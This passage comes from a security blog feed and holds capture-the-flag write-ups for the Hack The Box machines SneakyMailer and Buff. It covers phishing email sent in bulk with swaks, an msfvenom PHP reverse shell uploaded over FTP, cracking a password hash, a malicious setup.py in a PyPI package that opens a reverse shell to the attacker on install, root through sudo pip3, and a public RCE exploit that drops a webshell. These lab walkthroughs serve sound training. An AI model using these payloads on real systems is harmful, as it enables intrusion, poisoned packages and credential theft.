&lt;p&gt;As the port 25 is open, we can send email to the server.
Our phishing email will contain a simple
link to our machine &lt;code&gt;http://10.10.14.11:8080/test&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Hey try that:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;http://10.10.14.11:8000/test&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;HF&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;a href="https://github.com/jetmore/swaks"&gt;swaks&lt;/a&gt;
in order to automatically send our phishing email:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;while read l; do swaks --to $l --server 10.10.10.197 --body email; done &amp;lt;emails&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run a &lt;code&gt;netcat&lt;/code&gt; listener on port 8080 in order to see the incoming requests and
got some POST request containing a username and a password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -l -p 8000&lt;/span&gt;
&lt;span class="code-line"&gt;POST /test%0D HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.14.11:8000&lt;/span&gt;
&lt;span class="code-line"&gt;User-Agent: python-requests/2.23.0&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: */*&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: keep-alive&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 185&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd%40sneakymailer.htb&amp;amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="evolution"&gt;Evolution&lt;/h2&gt;
&lt;p&gt;It took me quit a long time to understand what these credentials where for. But
as the IMAP port is open we can connect to it with a mail client. We launch
evolution (already installed on Kali Linux) and configure it with the previous
information (note that the user is &lt;code&gt;paulbyrd&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;We found two emails in the &lt;code&gt;sent&lt;/code&gt; directory. The first on contain a password for
the &lt;code&gt;developer&lt;/code&gt; account.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hello administrator, I want to change this password for the developer account&lt;/p&gt;
&lt;p&gt;Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/p&gt;
&lt;p&gt;Please notify me when you do it&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The second one is a address to &lt;code&gt;low&lt;/code&gt; and give us some hint about one of the next step.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hello low&lt;/p&gt;
&lt;p&gt;Your current task is to install, test and then erase every python module you
find in our PyPI service, let me know if you have any inconvenience.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="ftp"&gt;FTP&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;developer&lt;/code&gt; account credentials allow us to connect to the FTP service. We
see that we can write on the &lt;code&gt;dev&lt;/code&gt; folder.&lt;/p&gt;
&lt;p&gt;This also take me some time to figure out but we can access our uploaded file on
the &lt;code&gt;dev&lt;/code&gt; environment accessible at &lt;a href="http://dev.sneakycorp.htb/test"&gt;http://dev.sneakycorp.htb/test&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Therefore we generate a simple PHP &lt;code&gt;meterpreter&lt;/code&gt; using &lt;code&gt;msfvenom&lt;/code&gt;: &lt;code&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw &amp;gt; lol.php&lt;/code&gt;
and upload it on the FTP server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;write on ftp dev (webshell)&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~$ ftp 10.10.10.197&lt;/span&gt;
&lt;span class="code-line"&gt;Connected to 10.10.10.197.&lt;/span&gt;
&lt;span class="code-line"&gt;220 (vsFTPd 3.0.3)&lt;/span&gt;
&lt;span class="code-line"&gt;Name (10.10.10.197:kali): developer&lt;/span&gt;
&lt;span class="code-line"&gt;331 Please specify the password.&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;230 Login successful.&lt;/span&gt;
&lt;span class="code-line"&gt;ftp&amp;gt; cd dev&lt;/span&gt;
&lt;span class="code-line"&gt;250 Directory successfully changed.&lt;/span&gt;
&lt;span class="code-line"&gt;ftp&amp;gt; put lol.php&lt;/span&gt;
&lt;span class="code-line"&gt;local: lol.php remote: lol.php&lt;/span&gt;
&lt;span class="code-line"&gt;200 PORT command successful. Consider using PASV.&lt;/span&gt;
&lt;span class="code-line"&gt;150 Ok to send data.&lt;/span&gt;
&lt;span class="code-line"&gt;226 Transfer complete.&lt;/span&gt;
&lt;span class="code-line"&gt;30687 bytes sent in 0.00 secs (7.3772 MB/s)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run the &lt;code&gt;metasploit&lt;/code&gt; handler and trigger our payload by browsing to &lt;a href="http://dev.sneakycorp.htb/lol.php"&gt;http://dev.sneakycorp.htb/lol.php&lt;/a&gt;.
This get us a shell as &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; getuid&lt;/span&gt;
&lt;span class="code-line"&gt;Server username: www-data (33)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="john"&gt;John&lt;/h2&gt;
&lt;p&gt;We browse the file system and found some &lt;code&gt;pypi&lt;/code&gt; sub domain and a &lt;code&gt;.htpasswd&lt;/code&gt; file
containing an encrypted password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; ls&lt;/span&gt;
&lt;span class="code-line"&gt;Listing: /var/www/pypi.sneakycorp.htb&lt;/span&gt;
&lt;span class="code-line"&gt;=====================================&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode              Size  Type  Last modified              Name&lt;/span&gt;
&lt;span class="code-line"&gt;----              ----  ----  -------------              ----&lt;/span&gt;
&lt;span class="code-line"&gt;100644/rw-r--r--  43    fil   2020-05-15 14:29:53 -0400  .htpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;40770/rwxrwx---   4096  dir   2020-08-07 07:12:52 -0400  packages&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x   4096  dir   2020-05-14 18:25:43 -0400  venv&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; cat .htpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run &lt;code&gt;john&lt;/code&gt; and the &lt;code&gt;rockyou&lt;/code&gt; dictionary on it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;md5crypt&amp;quot;, but the string is also recognized as &amp;quot;md5crypt-long&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=md5crypt-long&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;md5crypt&amp;quot;, but the string is also recognized as &amp;quot;md5crypt-opencl&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=md5crypt-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster&lt;/span&gt;
&lt;span class="code-line"&gt;Node numbers 1-8 of 8 (fork)&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;4 0g 0:00:00:05 5.58% (ETA: 14:16:12) 0g/s 19731p/s 19731c/s 19731C/s jeanix..jbhunt&lt;/span&gt;
&lt;span class="code-line"&gt;soufianeelhaoui  (pypi)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="pypi"&gt;PyPi&lt;/h2&gt;
&lt;p&gt;This new credentials set allows us to access the &lt;a href="https://pypi.org/"&gt;PyPi&lt;/a&gt;
server located at
&lt;a href="http://pypi.sneakycorp.htb:8080/"&gt;http://pypi.sneakycorp.htb:8080/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I had never made a Python package, neither use that in order to get a reverse
shell. A read a few &lt;a href="https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56"&gt;article about make and uploading package to pypi&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We then construct a specific package with a reverse shell code in &lt;code&gt;setup.py&lt;/code&gt;.
The structure of the package is the following.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;package&lt;/span&gt;
&lt;span class="code-line"&gt;├── build&lt;/span&gt;
&lt;span class="code-line"&gt;│   └── lib.linux-x86_64-2.7&lt;/span&gt;
&lt;span class="code-line"&gt;│       └── plop&lt;/span&gt;
&lt;span class="code-line"&gt;│           ├── __init__.py&lt;/span&gt;
&lt;span class="code-line"&gt;│           └── plop.py&lt;/span&gt;
&lt;span class="code-line"&gt;├── dist&lt;/span&gt;
&lt;span class="code-line"&gt;│   └── plop-0.3.tar.gz&lt;/span&gt;
&lt;span class="code-line"&gt;├── LICENSE.txt&lt;/span&gt;
&lt;span class="code-line"&gt;├── MANIFEST&lt;/span&gt;
&lt;span class="code-line"&gt;├── plop&lt;/span&gt;
&lt;span class="code-line"&gt;│   ├── __init__.py&lt;/span&gt;
&lt;span class="code-line"&gt;│   └── plop.py&lt;/span&gt;
&lt;span class="code-line"&gt;├── plop.egg-info&lt;/span&gt;
&lt;span class="code-line"&gt;│   ├── dependency_links.txt&lt;/span&gt;
&lt;span class="code-line"&gt;│   ├── PKG-INFO&lt;/span&gt;
&lt;span class="code-line"&gt;│   ├── SOURCES.txt&lt;/span&gt;
&lt;span class="code-line"&gt;│   └── top_level.txt&lt;/span&gt;
&lt;span class="code-line"&gt;├── README&lt;/span&gt;
&lt;span class="code-line"&gt;├── setup.cfg&lt;/span&gt;
&lt;span class="code-line"&gt;└── setup.py&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The code in &lt;code&gt;setup.py&lt;/code&gt; is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;setuptools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;setup&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pty&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;setuptools.command.install&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;getpass&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://10.10.14.11:8000/boom&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;getpass&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getuser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;kali&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.10.14.11&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fileno&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;&lt;span class="n"&gt;pty&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;plop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;         &lt;span class="c1"&gt;# How you named your package folder (MyLib)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="n"&gt;packages&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;plop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;   &lt;span class="c1"&gt;# Chose the same as &amp;quot;name&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="n"&gt;version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0.3&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;      &lt;span class="c1"&gt;# Start with a small number and increase it with every change you make&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="n"&gt;license&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MIT&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;        &lt;span class="c1"&gt;# Chose a license from here: https://help.github.com/articles/licensing-a-repository&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="n"&gt;cmdclass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;install&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;CustomInstall&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We build our package with &lt;code&gt;python setup.py sdist&lt;/code&gt; and upload it to the PyPi
server with &lt;code&gt;twine&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;twine upload --repository-url http://pypi.sneakycorp.htb:8080/ dist/* --verbose&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;At the same time we run a &lt;code&gt;netcat&lt;/code&gt; listener on our Kali box and wait for the
shell. We then have a shell as &lt;code&gt;low&lt;/code&gt; and can access the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -l -p 4444&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$ id&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$ cat ~/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat ~/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;73592699b63e47969c6de934654c2325&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We put our ssh public key in the &lt;code&gt;.ssh/authorized_keys&lt;/code&gt; file and connect to the
box using SSH and run &lt;code&gt;sudo -l&lt;/code&gt;. We found that we can run &lt;code&gt;pip3&lt;/code&gt; as root without
password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh low@10.10.10.197&lt;/span&gt;
&lt;span class="code-line"&gt;low@sneakymailer:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;^C^C^Csudo: unable to resolve host sneakymailer: Temporary failure in name resolution&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for low on sneakymailer:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User low may run the following commands on sneakymailer:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /usr/bin/pip3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We look at the &lt;a href="https://gtfobins.github.io/gtfobins/pip/#sudo"&gt;GTFObins page for pip&lt;/a&gt;
and run the commands to create a temporary directory, write a simple &lt;code&gt;setup.py&lt;/code&gt;
script executing a shell and installing this "script" as root which give us a
&lt;code&gt;root&lt;/code&gt; shell and allow us to read the &lt;code&gt;root&lt;/code&gt; flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;low@sneakymailer:~$ TF=$(mktemp -d)&lt;/span&gt;
&lt;span class="code-line"&gt;low@sneakymailer:~$ echo &amp;quot;import os; os.execl(&amp;#39;/bin/sh&amp;#39;, &amp;#39;sh&amp;#39;, &amp;#39;-c&amp;#39;, &amp;#39;sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&amp;#39;)&amp;quot; &amp;gt; $TF/setup.py&lt;/span&gt;
&lt;span class="code-line"&gt;low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF&lt;/span&gt;
&lt;span class="code-line"&gt;sudo: unable to resolve host sneakymailer: Temporary failure in name resolution&lt;/span&gt;
&lt;span class="code-line"&gt;Processing /tmp/tmp.FVBLBZ1NUO&lt;/span&gt;
&lt;span class="code-line"&gt;# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;3d8f51cb4506c19d77aea84d76e6a846&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The root part was really classic and easy. The user part was awesome! I learn so
much on this box and the conception is clearly different from classical boxes as
their is a lot of "interaction" with the "users" (phishing, pypi).&lt;/p&gt;
&lt;p&gt;I clearly recommend this box for an "unexpected" journey.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="phishing"></category><category term="pypi"></category></entry><entry><title>HTB: Buff</title><link href="https://maggick.fr/2020/11/htb-buff.html" rel="alternate"></link><published>2020-11-22T12:41:00+01:00</published><updated>2020-11-22T12:41:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-11-22:/2020/11/htb-buff.html</id><summary type="html">&lt;p&gt;&lt;img alt="Buff card" class="align-left" src="/media/2020.11/buff_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/263"&gt;Buff&lt;/a&gt; published on
July 18 2020
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
This box is classified as an easy machine.
The user part just require to exploit a CVE. The root part require first to
pivot to access the box's internal services then exploit another CVE.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.11/buff_card.png" alt="Buff card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/263"&gt;Buff&lt;/a&gt; published on
July 18 2020
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
This box is classified as an easy machine.
The user part just require to exploit a CVE. The root part require first to
pivot to access the box's internal services then exploit another CVE.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Despite being a Windows boxes, only a few services
are exposed: A port 8080 for an HTTP service and a port 7680 (probably another
HTB user port as we will see at the end of this writeup).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jul 25 08:59:16 2020 as: nmap -p- -sSV -oN nmap 10.10.10.198&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.198&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.16s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE    VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;7680/tcp open  pando-pub?&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website is a promotional website for a Gym.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Buff homepage" src="/media/2020.11/buff_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We browse the site and found the &lt;a href="http://10.10.10.198:8080/contact.php"&gt;contact page&lt;/a&gt;.
On it we can read that the site was "Made using Gym Management Software 1.0".&lt;/p&gt;
&lt;p&gt;Despite the site looking like a homemade site for the purpose of the box, this
is really a public product with a exploit available.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit Gym Management&lt;/span&gt;
&lt;span class="code-line"&gt;------------------------------------------------ ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                                  |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;------------------------------------------------ ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Gym Management System 1.0 - Unauthenticated RCE | php/webapps/48506.py&lt;/span&gt;
&lt;span class="code-line"&gt;------------------------------------------------ ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run the exploit, see who we are and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ python2 48506.py http://10.10.10.198:8080/&lt;/span&gt;
&lt;span class="code-line"&gt;            /\&lt;/span&gt;
&lt;span class="code-line"&gt;/vvvvvvvvvvvv \--------------------------------------,&lt;/span&gt;
&lt;span class="code-line"&gt;`^^^^^^^^^^^^ /============BOKU=====================&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;            \/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Successfully connected to webshell.&lt;/span&gt;
&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt; whoami&lt;/span&gt;
&lt;span class="code-line"&gt;�PNG&lt;/span&gt;
&lt;span class="code-line"&gt;�&lt;/span&gt;
&lt;span class="code-line"&gt;buff\shaun&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
